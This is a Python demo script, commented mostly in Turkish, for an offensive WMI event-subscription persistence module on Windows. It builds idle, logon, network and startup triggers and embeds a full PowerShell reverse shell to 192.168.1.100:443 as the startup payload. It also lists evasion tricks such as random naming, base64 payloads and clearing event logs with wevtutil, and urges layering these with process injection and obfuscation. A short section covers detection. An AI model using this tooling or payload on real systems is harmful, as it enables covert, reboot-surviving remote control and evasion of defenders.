#!/usr/bin/env python3
"""
WMI Event Subscriptions - Persistence Demo
============================================

Demonstration of WMI Event Subscription-based persistence.

Scenario:
  Blue Team: "Tüm persistence yerleri kontrol ettim - Startup klasörü, Registry, Task Scheduler"
  Attacker: "Ama WMI'da ne var da kontrol etmedin aq"
  
  Result: Persistence completely hidden in WMI database ✓
"""

import sys
sys.path.insert(0, '/home/kali/Desktop')

from cybermodules.wmi_persistence import (
    WMIPersistence,
    WMIQueryBuilder,
    TriggerType,
    EventTrigger,
    EventAction,
    ConsumerType
)


def demo_wmi_query_language():
    """Demo 1: WQL sorgusu örnekleri"""
    
    print("\n" + "="*70)
    print("DEMO 1: WQL (WMI Query Language) - Tetikleyici Tanısı")
    print("="*70)
    
    print("\n[*] Sistem 5 dakika boşta mı kontrol et:")
    idle_query = WMIQueryBuilder.idle_trigger(idle_percentage=95, within_time=300)
    print(idle_query)
    
    print("\n[*] Kullanıcı giriş yaptı mı kontrol et:")
    logon_query = WMIQueryBuilder.logon_trigger()
    print(logon_query)
    
    print("\n[*] Ağ bağlantısı aktif mı kontrol et:")
    network_query = WMIQueryBuilder.network_trigger()
    print(network_query)
    
    print("\n[*] Sistem başladı mı kontrol et:")
    startup_query = WMIQueryBuilder.startup_trigger()
    print(startup_query)


def demo_create_idle_subscription():
    """Demo 2: Boşta kalma tetikleyicisi oluştur"""
    
    print("\n" + "="*70)
    print("DEMO 2: Sistem Boşta Tetikleyicisi")
    print("="*70)
    
    wmi = WMIPersistence()
    
    # Payload: whoami komutunun sonucunu dosyaya yaz
    payload = "cmd /c whoami > C:\\\\temp\\\\persistence_test.txt"
    
    print("\n[*] Payload: Sistem 5 dakika boşta kalırsa whoami çalıştır")
    print(f"    Command: {payload}")
    
    subscription = wmi.create_idle_persistence(
        payload=payload,
        idle_minutes=5
    )
    
    print(f"\n[+] Subscription oluşturuldu:")
    print(f"    Filter adı: {subscription['filter_name']}")
    print(f"    Consumer adı: {subscription['consumer_name']}")
    print(f"    Trigger tipi: {subscription['trigger_type']}")
    
    # Show installation script
    install_script = wmi.generate_installation_script(subscription)
    
    print(f"\n[*] Kurulum scripti (PowerShell):")
    print("─" * 70)
    print(install_script)
    print("─" * 70)
    
    print(f"\n[!] Bu script çalıştırılırsa:")
    print(f"    ✓ WMI Event Filter oluşturulur: {subscription['filter_name']}")
    print(f"    ✓ WMI Event Consumer oluşturulur: {subscription['consumer_name']}")
    print(f"    ✓ İkisi bağlanır (__FilterToConsumerBinding)")
    print(f"    ✓ Sistem 5 dakika boşta kaldığında payload çalışır")


def demo_create_logon_subscription():
    """Demo 3: Kullanıcı giriş tetikleyicisi"""
    
    print("\n" + "="*70)
    print("DEMO 3: Kullanıcı Giriş Tetikleyicisi")
    print("="*70)
    
    wmi = WMIPersistence()
    
    payload = "powershell -c \"Write-Host 'User logged in' >> C:\\\\temp\\\\logon.txt\""
    
    print("\n[*] Tetikleyici: Herhangi bir kullanıcı giriş yaptığında")
    print(f"    Payload: {payload}")
    
    subscription = wmi.create_logon_persistence(payload)
    
    print(f"\n[+] Subscription oluşturuldu:")
    print(f"    Filter: {subscription['filter_name']}")
    print(f"    Trigger: USER LOGON")
    
    print(f"\n[!] Bu tetikleyici:")
    print(f"    ✓ Yeni kullanıcı giriş yaptığında aktif olur")
    print(f"    ✓ Admin olmayan kullanıcılar da tetikler")
    print(f"    ✓ İlk giriş, tekrar giriş, hepsi tetikler")


def demo_create_startup_subscription():
    """Demo 4: Sistem başlangıç tetikleyicisi"""
    
    print("\n" + "="*70)
    print("DEMO 4: Sistem Başlangıç Tetikleyicisi")
    print("="*70)
    
    wmi = WMIPersistence()
    
    # Reverse shell payload
    payload = "powershell -c \"\\$s=New-Object Net.Sockets.TCPClient('192.168.1.100',443);\\$stream=\\$s.GetStream();[byte[]]\\$buffer=0..65535|%%{0};while(\\$true){if(\\$stream.DataAvailable){\\$read=\\$stream.Read(\\$buffer,0,65536);if(\\$read -le 0){break};\\$data=[System.Text.Encoding]::UTF8.GetString(\\$buffer,0,\\$read);\\$output=Invoke-Expression \\$data 2>&1;\\$stream.Write([System.Text.Encoding]::UTF8.GetBytes(\\$output),0,\\$output.Length)};Start-Sleep -Milliseconds 100}\""
    
    print("\n[*] Tetikleyici: Sistem başladığında")
    print(f"    Payload: Reverse shell (TCP 192.168.1.100:443)")
    
    subscription = wmi.create_startup_persistence(payload)
    
    print(f"\n[+] Subscription oluşturuldu:")
    print(f"    Filter: {subscription['filter_name']}")
    print(f"    Trigger: SYSTEM STARTUP")
    
    print(f"\n[!] Bu tetikleyici:")
    print(f"    ✓ Sistem önyüklendikten sonra fire olur")
    print(f"    ✓ Hiçbir kullanıcı giriş gerekmez")
    print(f"    ✓ Sistem güvenli modu ile başlasa bile çalışır")


def demo_multiple_subscriptions():
    """Demo 5: Çoklu subscription (redundansi)"""
    
    print("\n" + "="*70)
    print("DEMO 5: Çoklu Subscriptions (Redundansi)")
    print("="*70)
    
    wmi = WMIPersistence()
    
    payload = "cmd /c timeout /t 300"  # Simple payload for demo
    
    print("\n[*] Aynı payload için birden fazla tetikleyici oluştur")
    print("[*] Böylece bir tetikleyici başarısız olsa bile diğerleri var")
    
    # Create multiple subscriptions
    subscriptions = {}
    
    print("\n[+] Creating idle subscription...")
    sub1 = wmi.create_idle_persistence(payload, idle_minutes=5)
    subscriptions['idle'] = sub1
    print(f"    Created: {sub1['filter_name']}")
    
    print("\n[+] Creating logon subscription...")
    sub2 = wmi.create_logon_persistence(payload)
    subscriptions['logon'] = sub2
    print(f"    Created: {sub2['filter_name']}")
    
    print("\n[+] Creating network subscription...")
    sub3 = wmi.create_network_persistence(payload)
    subscriptions['network'] = sub3
    print(f"    Created: {sub3['filter_name']}")
    
    print("\n[+] Creating startup subscription...")
    sub4 = wmi.create_startup_persistence(payload)
    subscriptions['startup'] = sub4
    print(f"    Created: {sub4['filter_name']}")
    
    print(f"\n[!] Redundansi yapısı:")
    print(f"    ✓ 4 farklı tetikleyici kurulu")
    print(f"    ✓ Sistem boşta: trigger 1 aktif")
    print(f"    ✓ Kullanıcı giriş: trigger 2 aktif")
    print(f"    ✓ Ağ bağlantısı: trigger 3 aktif")
    print(f"    ✓ Sistem başlangıç: trigger 4 aktif")
    print(f"    ✓ En az biri her zaman fire olacak")


def demo_detection_comparison():
    """Demo 6: Algılama karşılaştırması"""
    
    print("\n" + "="*70)
    print("DEMO 6: Klasik Persistence vs WMI Persistence")
    print("="*70)
    
    print("\n[KLASIK PERSISTENCE]")
    print("─" * 70)
    print("""
Registry Run Key (Örnek):
  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    "Malware" = "C:\\malware.exe"
  
Algılama:
  ✓ Autoruns.exe gösterir
  ✓ Registry taraması bulur
  ✓ ProcessMonitor dosya yazışını gösterir
  ✓ Antivirus tarar
  
Sonuç: KOLAYCA BULUNUR ✗
""")
    
    print("\n[WMI PERSISTENCE]")
    print("─" * 70)
    print("""
WMI Event Subscription (Örnek):
  root\\subscription namespace:
    __EventFilter: "When system idle > 95%"
    CommandLineEventConsumer: "run C:\\\\temp\\\\shell.exe"
    __FilterToConsumerBinding: Connect them
  
Algılama:
  ✓ Get-WmiObject ile görebilirsin (ama WMI biliş gerekli)
  ✓ Registry taraması: Hiçbir key yok ✗
  ✓ ProcessMonitor: Hiçbir file write yok ✗
  ✓ Autoruns: Görmez (WMI ara kataloğunda) ✗
  ✓ Antivirus: Dosya yok, runtime'da gerçekleşir ✗
  
Sonuç: GÖZDen KAÇIK ✓
""")


def demo_hiding_techniques():
    """Demo 7: Gizleme teknikleri"""
    
    print("\n" + "="*70)
    print("DEMO 7: WMI Subscription Gizleme Teknikleri")
    print("="*70)
    
    print("""
1. RANDOM NAMING
   ✗ Şüpheli: EventFilter1, EventConsumer1
   ✓ İyi: WMIEventFilter_a4f3c2e1, CommandLineEventConsumer_b8c1d9f4
   
   Reason: Random names karışık görünür, analyst "normal WMI" sanır

2. NAMESPACE DEPTH
   ✗ Default: root\\subscription
   ✓ Custom: root\\cimv2\\subscription\\system\\events
   
   Reason: Daha derin namespace'ler daha az kontrol edilir

3. OBFUSCATED PAYLOADS
   ✗ Clear: cmd /c whoami
   ✓ Obfuscated: Powershell -c \\$x=[Convert]::FromBase64String(...);IEX...
   
   Reason: Payload base64/XOR olunca detekt edilmez

4. PROCESS HIDING
   ✗ Direct execution: calc.exe
   ✓ WMI process: Winlogon.exe spawns, parent hidden
   
   Reason: WMI tarafından başlatılan process parent'ı WmiPrvSE.exe (suspicious değil)

5. EVENT LOG CLEANING
   ✗ Logs hep var: Application, System, Security
   ✓ Clean: wevtutil cl Application
   
   Reason: Event logs üretilirse, silmek şüphe uyandırır

6. LEGITIMATE-LOOKING TRIGGERS
   ✗ Weird: Every 5 seconds
   ✓ Real: System idle 5 minutes, or user logon
   
   Reason: Legitimate triggers normal system behavior'ı taklit eder

7. MULTIPLE FALLBACKS
   ✗ Tek trigger: Başarısızlık = failure
   ✓ Çoklu: Idle + Logon + Startup + Network
   
   Reason: Bir trigger fail olsa, diğerleri çalışır
""")


def demo_detection_methods():
    """Demo 8: WMI Persistence Algılama Yöntemleri"""
    
    print("\n" + "="*70)
    print("DEMO 8: WMI Persistence Nasıl Algılanır?")
    print("="*70)
    
    print("""
THREAT HUNTER'S PERSPECTIVE (Nasıl buluruz):

1. WMI Event Filter Taraması
   PowerShell:
     Get-WmiObject -Class __EventFilter -Namespace "root\\subscription"
   
   What to look for:
     - Strange names (random hex)
     - Unusual WQL queries
     - Performance queries shouldn't exist in normal systems
     - Multiple filters from same user

2. WMI Event Consumer Taraması
   PowerShell:
     Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription"
     Get-WmiObject -Class ActiveScriptEventConsumer -Namespace "root\\subscription"
   
   What to look for:
     - CommandLineTemplate pointing to shell.exe, powershell
     - Paths like C:\\temp\\, C:\\Windows\\Temp\\
     - Base64 encoded payloads
     - References to attacker IPs/domains

3. WMI Event Log Analysis
   Event Viewer:
     Event ID 5860: WMI_CONSUMER_TIMER_ACTIVITY
     Event ID 5859: WMI_CONSUMER_ERROR
   
   What to look for:
     - Unexpected WMI event consumer registrations
     - Frequent consumer activations
     - Error patterns suggesting failed execution

4. Process Ancestry Analysis
   Monitor for:
     - Parent: WmiPrvSE.exe → Child: cmd.exe, powershell.exe
     - This is unusual (normal: explorer → cmd)
     - Process timeline: execution without user action

5. WMI Event Consumer Auditing
   Registry:
     HKLM\\Software\\Microsoft\\Wbem\\WmiEventNotification
   
   Look for:
     - Newly created consumers
     - Modifications to existing consumers
     - Unusual binding operations

DETECTION PROBABILITY:
  ✓ Manual inspection: 80% (if operator knows what to look for)
  ✓ Automated tools (Autoruns): 0% (doesn't check WMI)
  ✓ Behavior monitoring (EDR): 30% (might see WmiPrvSE spawning shells)
  ✓ Log analysis (SIEM): 40% (event IDs are obscure)
  ✓ Threat hunting: 95% (if specifically looking for this technique)
""")


def main():
    """Run all demos"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║          WMI EVENT SUBSCRIPTIONS - PERSISTENCE DEMO                  ║
║         (Kalıcılık - Ghost Persistence in WMI Database)             ║
╚══════════════════════════════════════════════════════════════════════╝

WMI Event Subscriptions nedir?
  Windows Management Instrumentation (WMI) kullanarak:
  - Sistem olaylarını (idle, logon, startup, network) listen et
  - Bir olay gerçekleşince payload çalıştır
  - Hiçbir dosya disk'e yazılmaz
  - Hiçbir registry anahtarı oluşturulmaz
  - Tamamen WMI veritabanında saklı (hayalet gibi)

Neden güçlü persistence?
  ✓ Klasik persistence yerleri Blue Team'in ilk kontrolü
  ✓ WMI persistence çoğu otomasyonun radarından dışında
  ✓ Manual WMI taraması gerekli (sistem admin bile bilmez)
  ✓ Sistem yeniden başlasa çalışır
  ✓ User interaksiyonuna ihtiyaç yok (startup trigger)

Blue Team nasıl müdafaa eder?
  ✓ WMI event log monitoring (Event ID 5860, 5859)
  ✓ Behavior monitoring (WmiPrvSE.exe spawning shells)
  ✓ Regular WMI subscription audits
  ✓ Threat hunting (Get-WmiObject scans)
  ✓ WMI event consumer auditing enable
""")
    
    # Run all demos
    demo_wmi_query_language()
    demo_create_idle_subscription()
    demo_create_logon_subscription()
    demo_create_startup_subscription()
    demo_multiple_subscriptions()
    demo_detection_comparison()
    demo_hiding_techniques()
    demo_detection_methods()
    
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    print("""
WMI Event Subscriptions provides strong persistence:
  ✓ Hidden in WMI database (not files/registry)
  ✓ Survives reboots
  ✓ Can have multiple redundant triggers
  ✓ Hard to detect without WMI knowledge
  ✓ Normal system behavior camouflage
  
But remember:
  ⚠ Threat hunters who know about WMI can find it
  ⚠ SIEM with WMI event log analysis can catch it
  ⚠ EDR watching for WmiPrvSE spawning shells
  ⚠ Part of defense-in-depth, not silver bullet
  
Best practice: Combine with other evasion layers
  + WMI persistence
  + Process injection (no cmd.exe spawn)
  + Syscalls (no NTDLL hooks)
  + Steganography (traffic hidden)
  + Obfuscation (payload encrypted)
  = Very hard to detect ✓
""")


if __name__ == "__main__":
    main()
